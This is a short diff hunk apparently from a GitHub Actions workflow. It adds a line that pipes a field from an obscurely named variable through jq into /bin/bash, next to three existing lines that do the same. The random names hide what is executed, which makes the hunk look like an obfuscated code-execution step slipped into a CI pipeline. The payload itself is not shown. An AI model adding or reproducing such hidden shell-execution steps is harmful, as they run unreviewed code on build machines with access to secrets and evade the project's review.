@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$vsqbt8671" | jq -r .f254 | /bin/bash
           printf '%s' "$kgpgo440" | jq -r .k1788 | /bin/bash
           printf '%s' "$mqj292" | jq -r .vpck6 | /bin/bash
+          echo $bmpb7 | jq -r .ahuoa9 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
